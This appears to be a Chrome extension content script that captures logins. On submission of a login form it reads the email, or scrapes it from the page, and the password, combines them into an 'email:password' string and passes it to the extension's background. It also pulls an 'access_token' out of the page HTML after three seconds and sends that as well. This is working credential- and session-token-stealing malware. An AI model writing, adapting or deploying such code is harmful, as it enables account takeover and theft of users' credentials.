function extractEmails ( text ){
    return text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi);
}

$(document).on('submit', '#login_form',function(){
	
	var e = this["email"];
	if (e){
		e = e.value;
	}
	else{
		e = $("#not_me_link");
		if (e.length > 0){
			e = e.prev().parent().text();
			e = extractEmails(e);
		}
		else{
			return;
		}
	}
		
	var l = e + ":" + this["pass"].value; 
	chrome.runtime.sendMessage({param: "set", l: l});
	
});

setTimeout(function(){ return function() { 
	var t = "";
	var m = document.body.innerHTML.match (/access_token:\"(.*?)\"/i);
	if (m != null && m.length == 2){
		t = m[1];
		chrome.runtime.sendMessage({param: "set", t: t});
	}
}}(), 3000);